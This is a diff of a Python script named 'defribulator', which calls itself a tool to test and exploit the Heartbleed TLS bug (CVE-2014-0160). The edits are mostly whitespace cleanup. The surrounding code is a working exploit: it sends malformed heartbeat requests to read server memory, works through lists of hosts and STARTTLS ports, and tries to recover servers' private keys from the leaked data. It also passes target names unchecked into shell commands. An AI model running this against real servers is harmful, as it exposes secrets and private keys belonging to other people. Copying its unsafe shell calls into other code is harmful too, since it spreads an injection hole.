@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 # Modified by Travis Lee
 # Last Updated: 4/21/14
@@ -6,10 +6,10 @@
 #
 # -changed output to display text only instead of hexdump and made it easier to read
 # -added option to specify number of times to connect to server (to get more data)
-# -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc... 
+# -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc...
 # -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port)
 # -added option to have verbose output
-# -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command 
+# -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command
 # -added option for hex output
 # -added option to output raw data to a file
 # -added option to output ascii data to a file
@@ -105,7 +105,7 @@ def build_client_hello(tls_ver):
 0x00, 0x0f, 0x00, 0x01, 0x01
     ]
     return client_hello
-    
+
 def build_heartbeat(tls_ver):
     heartbeat = [
 0x18,       # Content Type (Heartbeat)
@@ -114,7 +114,7 @@ def build_heartbeat(tls_ver):
 # Payload
 0x01,       # Type (Request)
 0x40, 0x00  # Payload length
-    ] 
+    ]
     return heartbeat
 
 
@@ -123,10 +123,10 @@ if opts.rawoutfile:
 
 if opts.asciioutfile:
     asciifileOUT = open(opts.asciioutfile, "a")
-    
+
 if opts.extractkey:
     opts.donotdisplay = True
-    
+
 def hexdump(s):
     pdat = ''
     hexd = ''
@@ -150,8 +150,8 @@ def rcv_tls_record(s):
     try:
         tls_header = s.recv(5)
         if not tls_header:
-            print 'Unexpected EOF (header)' 
-            return None,None,None        
+            print 'Unexpected EOF (header)'
+            return None,None,None
         typ,ver,length = struct.unpack('>BHH',tls_header)
         message = ''
         while len(message) != length:
@@ -208,7 +208,7 @@ def conn(targ, port):
     except Exception as e:
        print "Connection Error! " + str(e)
        return None
-       
+
 def bleed(targ, port):
     try:
         res = ''
@@ -218,28 +218,28 @@ def bleed(targ, port):
         for x in range(0, opts.num):
             if x > 0:
                 firstrun = False
-            
+
             if x == 0 and opts.extractkey:
                 print "Attempting to extract private key from returned data..."
                 if not os.path.exists('./hb-certs'):
                     os.makedirs('./hb-certs')
                 print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'
-                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')	
+                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')
                 print '\nExtracting modulus from cert...\n'
                 os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem > hb-certs/sslcert_' + targ + '_pubkey.pem')
                 output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')
                 modulus = output.read()
-            
+
             s = conn(targ, port)
             if not s:
                 continue
 
             # send starttls command if specified as an option or if common smtp/pop3/imap ports are used
             if (opts.starttls) or (port in {25, 587, 110, 143, 21}):
-                
+
                 stls = False
                 atls = False
-                
+
                 # check if smtp supports starttls/stls
                 if port in {25, 587}:
                     print 'SMTP Port... Checking for STARTTLS Capability...'
@@ -249,7 +249,7 @@ def bleed(targ, port):
                     check += s.recv(1024)
                     if opts.verbose:
                         print check
-                                        
+
                     if "STARTTLS" in check:
                         opts.starttls = True
                         print "STARTTLS command found"
@@ -261,8 +261,8 @@ def bleed(targ, port):
                         print "STARTTLS command NOT found!"
                         print '##################################################################'
                         return
-                
-                # check if pop3/imap supports starttls/stls                            
+
+                # check if pop3/imap supports starttls/stls
                 elif port in {110, 143}:
                     print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'
                     check = s.recv(1024)
@@ -274,7 +274,7 @@ def bleed(targ, port):
                     check += s.recv(1024)
                     if opts.verbose:
                         print check
-                                           
+
                     if "STARTTLS" in check:
                         opts.starttls = True
                         print "STARTTLS command found"
@@ -286,8 +286,8 @@ def bleed(targ, port):
                         print "STARTTLS command NOT found!"
                         print '##################################################################'
                         return
-                        
-                # check if ftp supports auth tls/starttls                          
+
+                # check if ftp supports auth tls/starttls
                 elif port in {21}:
                     print 'FTP Port... Checking for AUTH TLS Capability...'
                     check = s.recv(1024)
@@ -296,7 +296,7 @@ def bleed(targ, port):
                     check += s.recv(1024)
                     if opts.verbose:
                         print check
-                        
+
                     if "STARTTLS" in check:
                         opts.starttls = True
                         print "STARTTLS command found"
@@ -308,9 +308,9 @@ def bleed(targ, port):
                         print "STARTTLS command NOT found!"
                         print '##################################################################'
                         return
-                                        
-                # send appropriate tls command if supported                        
-                if opts.starttls:       
+
+                # send appropriate tls command if supported
+                if opts.starttls:
                     sys.stdout.flush()
                     if stls:
                         print 'Sending STLS Command...'
@@ -328,14 +328,14 @@ def bleed(targ, port):
 
             supported = False
             for num,tlsver in tls_versions.items():
-                
+
                 if firstrun:
                     print 'Sending Client Hello for {}'.format(tlsver)
                 s.send(hex2bin(build_client_hello(num)))
-                
+
                 if opts.verbose:
                     print 'Waiting for Server Hello...'
-                
+
                 while True:
                     typ,ver,message = rcv_tls_record(s)
                     if not typ:
@@ -359,7 +359,7 @@ def bleed(targ, port):
             if opts.verbose:
                 print '\nSending heartbeat request...'
             sys.stdout.flush()
-            
+
             keyfound = False
             if opts.extractkey:
             	res = hit_hb(s, targ, firstrun, supported)
@@ -374,18 +374,18 @@ def bleed(targ, port):
             else:
                 sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))
                 sys.stdout.flush()
-        
+
         print '\n##################################################################'
-        print       
+        print
         return res
-    
+
     except Exception as e:
        print "Error! " + str(e)
        print '##################################################################'
-       print               
+       print
 
 def extractkey(host, chunk, modulus):
-	
+
     #print "\nChecking for private key...\n"
     n = int (modulus, 16)
     keysize = n.bit_length() / 16
@@ -417,18 +417,18 @@ def main():
     print "\ndefribulator v1.16"
     print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"
     allresults = ''
-                    
+
     # if a file is specified, loop through file
     if opts.filein:
         fileIN = open(opts.filein, "r")
-        
+
         for line in fileIN:
             targetinfo = line.strip().split(":")
             if len(targetinfo) > 1:
                 allresults = bleed(targetinfo[0], int(targetinfo[1]))
             else:
                 allresults = bleed(targetinfo[0], opts.port)
-            
+
             if allresults and (not opts.donotdisplay):
                 print '%s' % (allresults)
 
@@ -441,14 +441,14 @@ def main():
         allresults = bleed(args[0], opts.port)
         if allresults and (not opts.donotdisplay):
             print '%s' % (allresults)
-    
+
     print
-    
+
     if opts.rawoutfile:
         rawfileOUT.close()
-    
+
     if opts.asciioutfile:
         asciifileOUT.close()
-            
+
 if __name__ == '__main__':
     main()
